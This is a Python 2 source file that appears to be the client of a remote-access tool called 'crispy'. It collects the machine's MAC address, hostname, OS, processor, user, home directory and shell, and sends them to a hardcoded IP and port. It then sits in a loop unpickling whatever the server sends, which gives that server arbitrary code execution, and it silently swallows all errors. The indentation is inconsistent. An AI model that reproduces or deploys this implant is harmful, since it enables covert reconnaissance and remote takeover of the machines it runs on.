import cPickle
import datetime
import json
import os
import platform
import sys
import time
import uuid

from crispy.network.client_types import CrispyTCPClient

def enum():
    macaddr = None
    hostname = None
    plat = None
    proc_type = None   
    proc_arch = None
    uptime = None
    date = None
    user = None
    home = None
    shell = None
    
    try:
	macaddr = ':'.join(("%012x" % uuid.getnode())[i:i+2] for i in range(0, 12, 2)) 
    except:
	pass

    try:
	hostname = platform.node() 
    except:
	pass

    try:
	plat = "{} {}".format(platform.system(), platform.release())
    except:
	pass

    try:
        proc_type = platform.processor()
    except:
        pass

    try:
        proc_arch = platform.machine()
    except:
        pass

    try:
        uptime = "forever"
    except:
        pass

    try:
        date = str(datetime.datetime.now()).split(".")[0]
    except:
        pass

    try:
        user = os.getenv('USER')
    except:
        pass

    try:
        home = os.getenv('HOME')
    except:
        pass

    try:
        shell = os.getenv('SHELL')
    except:
        pass

    return (macaddr, hostname, plat, proc_type, proc_arch, uptime, date, user, home, shell)

def main():
    host, port = "192.168.1.152", 8080

    try:
	sock = CrispyTCPClient().connect(host, port)
	sock.send(json.dumps(enum()))
	while True:
	    data = cPickle.loads(sock.recv(1024))
            sock.send(data)
    except KeyboardInterrupt: 
	pass
    except:
        pass

if __name__ == "__main__":
    main()
